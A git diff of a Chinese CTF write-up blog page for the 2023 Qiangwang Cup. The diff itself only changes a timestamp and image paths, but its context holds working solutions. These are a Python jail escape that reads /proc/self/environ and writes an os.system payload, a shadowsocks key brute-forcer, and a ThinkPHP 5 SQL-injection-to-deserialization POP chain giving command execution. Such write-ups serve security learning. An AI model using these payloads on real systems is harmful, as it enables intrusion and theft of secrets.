@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/background/fj_img/27.jpg">
 <meta property="article:published_time" content="2024-01-09T17:26:48.000Z">
-<meta property="article:modified_time" content="2024-01-09T17:35:41.916Z">
+<meta property="article:modified_time" content="2024-03-05T06:12:44.488Z">
 <meta property="article:author" content="dddkia">
 <meta property="article:tag" content="misc">
 <meta property="article:tag" content="wp">
@@ -368,7 +368,7 @@
 <p>open没有过滤，环境变量的flag没删除</p>
 <p><code>&#123;print(open("/proc/self/environ").read())&#125;</code></p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122320626.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122320626.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <h2 id="pyjail-its-myrevenge">Pyjail ! It's myRevenge !!!</h2>
@@ -383,7 +383,7 @@ code后直接调用读flag</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Bash">&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>).write(<span class="hljs-string">&quot;im&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;port&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot; o&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;s;o&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;s.syste&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>).write(<span class="hljs-string">&quot;m(&quot;</span>+chr(34)+<span class="hljs-string">&quot;cat f* &gt; 2&quot;</span>+chr(34)+<span class="hljs-string">&quot;)&quot;</span>)&#125;<br>&#123;open(<span class="hljs-string">&quot;co&quot;</span>+<span class="hljs-string">&quot;de.py&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(open(<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-built_in">read</span>())&#125;<br>&#123;<span class="hljs-built_in">print</span>(open(<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).<span class="hljs-built_in">read</span>())&#125;<br></code></pre></td></tr></table></figure>
 <figure>
-<img src="../img/2023第七届强网杯/17048212231721.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/17048212231721.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <h2 id="easyfuzz">easyfuzz</h2>
@@ -403,11 +403,11 @@ code后直接调用读flag</li>
 <p>https://github.com/junzis/pyModeS</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Bash">import pyModeS as pms<br><br>with open(<span class="hljs-string">&#x27;payload.txt&#x27;</span>) as f:<br>    res = f.read().<span class="hljs-built_in">split</span>()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    <span class="hljs-keyword">if</span> len(i) == 46:<br>        pms.tell(i[18:])<br></code></pre></td></tr></table></figure>
 <figure>
-<img src="../img/2023第七届强网杯/17048212231722.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/17048212231722.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <figure>
-<img src="../img/2023第七届强网杯/17048212231723.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/17048212231723.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>flag为md5('79a05e')</p>
@@ -424,7 +424,7 @@ https://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/cryptor.py</p
 <p>需要爆破密钥</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs Bash">import hashlib<br>from Crypto.Cipher import AES<br><br>def EVP_BytesToKey(password, key_len, iv_len):<br>    <span class="hljs-comment"># equivalent to OpenSSL&#x27;s EVP_BytesToKey() with count 1</span><br>    <span class="hljs-comment"># so that we make the same key and iv as nodejs version</span><br>    <span class="hljs-keyword">if</span> hasattr(password, <span class="hljs-string">&#x27;encode&#x27;</span>):<br>        password = password.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-comment"># cached_key = &#x27;%s-%d-%d&#x27; % (password, key_len, iv_len)</span><br>    <span class="hljs-comment"># r = cached_keys.get(cached_key, None)</span><br>    <span class="hljs-comment"># if r:</span><br>        <span class="hljs-comment"># return r</span><br>    m = []<br>    i = 0<br>    <span class="hljs-keyword">while</span> len(b<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(m)) &lt; (key_len + iv_len):<br>        md5 = hashlib.md5()<br>        data = password<br>        <span class="hljs-keyword">if</span> i &gt; 0:<br>            data = m[i - 1] + password<br>        md5.update(data)<br>        m.append(md5.digest())<br>        i += 1<br>    ms = b<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(m)<br>    key = ms[:key_len]<br>    iv = ms[key_len:key_len + iv_len]<br>    <span class="hljs-comment"># cached_keys[cached_key] = (key, iv)</span><br>    <span class="hljs-built_in">return</span> key, iv<br><br>def decrypt(cipher,password):<br>    key_len = int(256/8)<br>    iv_len = 16<br>    key, _ = EVP_BytesToKey(password, key_len, iv_len)<br>    cipher = bytes.fromhex(cipher)<br>    iv = cipher[:iv_len]<br>    real_cipher = cipher[iv_len:]<br>    obj = AES.new(key, AES.MODE_CFB, iv, segment_size=128)<br>    plain = obj.decrypt(real_cipher)<br>    <span class="hljs-built_in">return</span> plain<br><br><span class="hljs-comment">#tcp原始hex数据</span><br>req_cipher = <span class="hljs-string">&#x27;&#x27;</span><br>res_cipher = <span class="hljs-string">&#x27;&#x27;</span><br><br>with open(<span class="hljs-string">&#x27;password.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    passwords = f.readlines()<br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>    password.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    req_plain = decrypt(req_cipher,password)<br>    res_plain = decrypt(res_cipher,password)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;HTTP&#x27;</span> <span class="hljs-keyword">in</span> req_plain:<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;password:&#123;password&#125;&quot;</span>,f<span class="hljs-string">&quot;\nreq_plain:&#123;req_plain&#125;&quot;</span>,f<span class="hljs-string">&quot;\nres_plain:&#123;res_plain&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>
 <figure>
-<img src="../img/2023第七届强网杯/17048212231724.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/17048212231724.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>flag为md5('Why-do-you-want-to-know-what-this-is')</p>
@@ -434,7 +434,7 @@ https://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/cryptor.py</p
 <p><code>HTTP/2 client preface string missing or corrupt. Hex dump for received bytes`` xxx</code></p>
 <p>搜索一下发现是grpc服务</p>
 <figure>
-<img src="../img/2023第七届强网杯/17048212231725.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/17048212231725.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>grpcui本地启动，ProcessMsg方法有参数serializeData</p>
@@ -444,14 +444,14 @@ https://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/cryptor.py</p
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">docker load &lt; thinkshop.tar<br>docker run -tid --name thinkshop -p 36000:80 -e FLAG=flag&#123;test_flag&#125; thinkshop<br></code></pre></td></tr></table></figure>
 <p>thinkphp5.0.23，目录结构如下</p>
 <figure>
-<img src="../img/2023第七届强网杯/17048212231726.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/17048212231726.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>Admin.php有登录功能</p>
 <p>根目录下有shop.sql</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-comment">-- Records of admin</span><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `admin` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span>);<br></code></pre></td></tr></table></figure>
 <figure>
-<img src="../img/2023第七届强网杯/17048212231737.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/17048212231737.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>正常应该是admin;123456登录，但是传入的username直接放到了find方法的参数中</p>
@@ -459,22 +459,22 @@ https://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/cryptor.py</p
 <p>定位到<code>application/index/view/admin/goods_edit.html</code></p>
 <p>将data数据反序列化，可以打tp5的反序列化链rce</p>
 <figure>
-<img src="../img/2023第七届强网杯/17048212231738.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/17048212231738.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>Admin.php的do_edit方法，将data传入saveGood处理</p>
 <figure>
-<img src="../img/2023第七届强网杯/17048212231739.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/17048212231739.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>跟进，传到updatedata</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317310.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317310.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>Update.php，从数据库里读数据，value限制得很死，但是这里注意到key是没有过滤的，可以sql注入</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317311.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317311.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>理清一下思路，key注入将序列化的数据传入数据库，读取再反序列化造成rce</p>
@@ -482,18 +482,18 @@ https://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/cryptor.py</p
 <p>网上找的tp5.1链子，这里注意加上array（序列化有markdownToArray函数，getGoodsbyId函数检测<code>YTo</code>前缀）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>;<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>)];<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;ls&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$aaa</span>)));<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">Model</span><br>    &#123;&#125;<br>&#125;<br><span class="hljs-title class_">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Model</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$parent</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;append[<span class="hljs-string">&#x27;jelly&#x27;</span>] = <span class="hljs-string">&#x27;getError&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-keyword">new</span> relation\<span class="hljs-title function_ invoke__">BelongsTo</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-built_in">parent</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Relation</span></span><br><span class="hljs-class">    </span>&#123;&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">relation</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">db</span>\<span class="hljs-title class_">Query</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Relation</span>;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OneToOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Relation</span></span><br><span class="hljs-class">    </span>&#123;&#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BelongsTo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OneToOne</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;query = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Query</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;bindAttr = [<span class="hljs-string">&#x27;&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">db</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">console</span>\<span class="hljs-title class_">Output</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$model</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">console</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">session</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Memcache</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Output</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$styles</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$handle</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memcache</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">session</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Memcached</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcache</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span>  = [<br>            <span class="hljs-string">&#x27;expire&#x27;</span>       =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;session_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        ];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memcached</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Request</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcached</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tag</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-comment">// pop链中需要prefix存在，否则报错</span><br>            <span class="hljs-variable language_">$this</span>-&gt;options = [<span class="hljs-string">&#x27;prefix&#x27;</span>   =&gt; <span class="hljs-string">&#x27;jelly/&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;tag = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Request</span><br>    &#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">get</span>     = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filter</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;filter = <span class="hljs-variable">$function</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;get = [<span class="hljs-string">&quot;jelly&quot;</span>=&gt;<span class="hljs-variable">$parameter</span>];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317312.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317312.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317313.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317313.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <h1 id="强网先锋">强网先锋</h1>
 <h2 id="找到png了吗">找到PNG了吗</h2>
 <p>vol打不开，010打开文件头为<code>EMiL</code>，linux镜像，banner看对应操作系统</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317314.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317314.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>根据Ubuntu版本制作对应的profile</p>
@@ -508,38 +508,38 @@ https://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/cryptor.py</p
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">89504E47:e5afbeba<br></code></pre></td></tr></table></figure>
 <p>根据文件头尾找到加密的png</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317315.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317315.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>再两次rc4得到png</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317316.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023第七届强网杯/170482122317316.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>得到flag</p>
 <figure>
-<img src="../img/2023第七届强网杯/170482122317317.png" srcset="/img/loading.gif" lazyload alt="img" />
